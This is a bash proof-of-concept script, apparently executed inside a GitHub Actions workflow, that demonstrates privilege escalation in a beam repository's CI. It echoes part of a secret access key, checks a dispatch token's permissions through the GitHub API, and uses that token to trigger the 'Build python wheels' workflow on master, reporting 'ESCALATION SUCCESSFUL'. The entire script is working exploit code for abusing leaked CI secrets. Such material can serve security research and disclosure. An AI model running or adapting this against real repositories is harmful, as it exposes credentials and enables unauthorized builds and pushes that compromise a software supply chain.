#!/bin/bash
echo "========================================="
echo "  CRITICAL: Privilege Escalation PoC v2"
echo "  Attacker: treborlab → robertprast/beam"
echo "  Time: $(date -u)"
echo "========================================="

echo ""
echo "=== Secrets ==="
echo "DEVELOCITY_ACCESS_KEY: ${DEVELOCITY_ACCESS_KEY:0:15}..."
echo "GH_TOKEN_FOR_DISPATCH length: ${#GH_TOKEN_FOR_DISPATCH}"

echo ""
echo "=== Token Permissions ==="
curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
  https://api.github.com/repos/$GITHUB_REPOSITORY \
  | jq '{full_name, permissions}' 2>/dev/null

echo ""
echo "=== Dispatching build_wheels.yml ==="
BUILD_WF_ID=$(curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
  jq '.workflows[] | select(.name == "Build python wheels") | .id')

echo "Workflow ID: $BUILD_WF_ID"

if [ -n "$BUILD_WF_ID" ] && [ "$BUILD_WF_ID" != "null" ]; then
  HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST \
    -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
    "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/$BUILD_WF_ID/dispatches" \
    -d '{"ref":"master"}')
  echo "Dispatch status: $HTTP"
  if [ "$HTTP" = "204" ]; then
    echo "=== ESCALATION SUCCESSFUL ==="
    echo "build_wheels.yml dispatched → will push to master"
  fi
else
  echo "Workflow not found, listing available:"
  curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
    "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
    jq '.workflows[] | {id, name, state}' 2>/dev/null | head -20
fi
